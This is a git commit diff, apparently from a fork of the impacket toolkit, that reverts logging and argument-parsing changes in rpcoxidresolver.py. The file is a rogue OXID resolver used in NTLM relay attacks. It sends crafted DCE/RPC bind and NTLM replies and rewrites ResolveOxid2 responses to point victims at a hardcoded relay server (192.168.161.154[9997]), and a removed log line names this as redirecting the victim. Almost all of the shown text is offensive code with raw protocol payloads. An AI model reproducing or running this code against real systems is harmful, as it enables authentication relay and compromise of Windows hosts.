08468ef0ceb642419738ad2ef525532f6240b74b
MrAle98 <ale18109800@gmail.com>
2022-04-20 17:44:35 +0200

    Revert "added information printing rpcoxidresolver"
    This reverts commit c821777ed8b57ebeb292f42883c4e9d7a8ca6521.

--- examples/rpcoxidresolver.py
+++ examples/rpcoxidresolver.py
@@ -3,12 +3,7 @@ from impacket.dcerpc.v5 import rpcrt
 from impacket import ntlm
 import datetime
 import struct
-import argparse
-import logging
-import sys
 
-rpcrelayserverip = ""
-rpcrelayserverport = ""
 
 def ntlmBind(received_packet):
     resp_data = b"\x05\x00\x0c\x07\x10\x00\x00\x00\x48\x01\x04\x01\x03\x00\x00\x00" \
@@ -46,7 +41,6 @@ def ntlmBind(received_packet):
 def resolveOxid2Reply(received_packet):
     received_request = rpcrt.MSRPCRequestHeader(received_packet.getData())
     if received_request["auth_len"] != 0:
-        print("Got resolveOxid2 request with auth_len != 0. Skipping it...")
         resp_data = b"\x05\x00\x03\x03\x10\x00\x00\x00\x20\x00\x00\x00\x03\x00\x00\x00" \
                     b"\x20\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00"
         packet = rpcrt.MSRPCRespHeader(resp_data)
@@ -54,7 +48,6 @@ def resolveOxid2Reply(received_packet):
         packet["ctx_id"] = received_request["ctx_id"]
         return packet
     else:
-        print("[+] Got resolveOxid2 Request with auth_len == 0. Redirecting victim to rpc relay server %s[%s]"%(rpcrelayserverip,rpcrelayserverport))
         resp_data = b"\x05\x00\x02\x03\x10\x00\x00\x00\x6c\x00\x00\x00\x04\x00\x00\x00" \
                     b"\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x16\x00\x00\x00" \
                     b"\x16\x00\x12\x00\x07\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00" \
@@ -66,8 +59,7 @@ def resolveOxid2Reply(received_packet):
         prevPduLen = packet["dataLen"]
         oxid2Response = dcomrt.ResolveOxid2Response(packet["pduData"])
         newaStringArray = oxid2Response['ppdsaOxidBindings']['aStringArray']
-        stringBinding = "%s[%s]"%(rpcrelayserverip,rpcrelayserverport)
-        newaStringArray[1:-6] = list(stringBinding.encode('UTF-8'))
+        newaStringArray[1:-6] = list("192.168.161.154[9997]".encode('UTF-8'))
         oxid2Response["ppdsaOxidBindings"]["aStringArray"] = newaStringArray
         oxid2Response["ppdsaOxidBindings"]["wNumEntries"] = len(oxid2Response["ppdsaOxidBindings"]["aStringArray"])
         oxid2Response["ppdsaOxidBindings"]["wSecurityOffset"] = len(oxid2Response["ppdsaOxidBindings"]["aStringArray"][:-4])
@@ -92,10 +84,8 @@ def serverAlive2Reply(received_packet):
 
 def bind(received_packet):
     if received_packet["auth_len"] != 0:
-        print("Got NTLM_TYPE_1 message. Replying with NTLM_TYPE_2")
         return ntlmBind(received_packet)
     else:
-        print("Got MSRPC_BIND message with no NTLM_TYPE_1 message. Replying with MSRPC_BINDACK")
         resp_data = b"\x05\x00\x0c\x03\x10\x00\x00\x00\x54\x00\x00\x00\x02\x00\x00\x00" \
                     b"\xd0\x16\xd0\x16\xff\xbd\x2f\x01\x05\x00\x39\x39\x39\x39\x00\x00" \
                     b"\x02\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11" \
@@ -109,28 +99,10 @@ def bind(received_packet):
 
 
 def main():
-    parser = argparse.ArgumentParser(description='rogue oxid resolver')
-    parser.add_argument('-oip', action='store', metavar="ip address", help='ip address of the oxid resolver')
-    parser.add_argument('-rip', action='store', metavar="ip address", help='ip address of the rpc relay server')
-    parser.add_argument('-rport', action='store', metavar="ip address", help='tcp port of the rpc relay server')
-    try:
-        options = parser.parse_args()
-        if not options.oip or not options.rip or not options.rport:
-            parser.print_help()
-            sys.exit(1)
-
-        global rpcrelayserverip, rpcrelayserverport
-        rpcrelayserverip = options.rip
-        rpcrelayserverport = options.rport
-        oxidip = options.oip
-    except:
-        parser.print_help()
-        sys.exit(1)
     try:
         server = rpcrt.DCERPCServer()
         server.setListenPort(135)
-        server.setListenAddress(oxidip)
-        print("server start listening")
+        server.setListenAddress("192.168.161.154")
         while True:
             server._sock.listen(10)
 
@@ -142,13 +114,11 @@ def main():
                         resp = bind(packet)
                         server.send(resp)
                     elif packet['type'] == rpcrt.MSRPC_AUTH3:
-                        print("Got NTLM_TYPE_3 message skipping it...")
                         pass
                     elif packet['type'] == rpcrt.MSRPC_REQUEST and rpcrt.MSRPCRequestHeader(packet.getData())['op_num']== 4:
                         resp = resolveOxid2Reply(packet)
                         server.send(resp)
                     elif packet['type'] == rpcrt.MSRPC_REQUEST and rpcrt.MSRPCRequestHeader(packet.getData())['op_num']== 5:
-                        print("Got serverAlive2 request. Skipping it...")
                         resp = serverAlive2Reply(packet)
                         server.send(resp)
 
